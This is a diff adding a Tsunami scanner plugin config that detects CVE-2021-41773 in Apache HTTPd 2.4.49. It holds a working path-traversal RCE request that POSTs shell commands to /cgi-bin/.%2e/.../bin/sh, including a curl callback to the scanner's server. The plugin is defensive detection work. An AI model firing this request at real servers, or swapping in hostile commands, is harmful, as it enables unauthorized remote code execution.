@@ -1,0 +1,91 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheHTTPd_CVE_2021_41773"
+  author: "Tsunami Team (tsunami-dev@google.com)"
+  version: "0.1"
+  description: "Detects CVE-2021-41773 RCE vulnerability in Apache HTTPd 2.4.49."
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2021_41773"
+  }
+  severity: CRITICAL
+  title: "Apache RCE Vulnerability CVE-2021-41773"
+  description: "This version of Apache is vulnerable to a Remote Code Execution vulnerability described in CVE-2021-41773. If CGI is enabled, the path traversal allows execution of arbitrary commands."
+  recommendation: "Update to 2.4.51 release."
+}
+
+config: {
+  debug: true
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "trigger_rce"
+  http_request: {
+    method: POST
+    uri: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+    data: "echo Content-Type: text/plain; echo; {{ PAYLOAD }}"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ PATTERN }}" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  variables: [
+    { name: "PAYLOAD" value: "curl {{ T_CBS_URI }}"},
+    { name: "PATTERN" value: ""}
+  ]
+  actions: [
+    "trigger_rce",
+    "sleep",
+    "check_callback"
+  ]
+}
+
+workflows: {
+  variables: [
+    { name: "PAYLOAD" value: "printf %s%s%s TSUNAMI_PAYLOAD_START tsunami-rce TSUNAMI_PAYLOAD_END"},
+    { name: "PATTERN" value: "TSUNAMI_PAYLOAD_STARTtsunami-rceTSUNAMI_PAYLOAD_END"}
+  ]
+  actions: [
+    "trigger_rce"
+  ]
+}
+
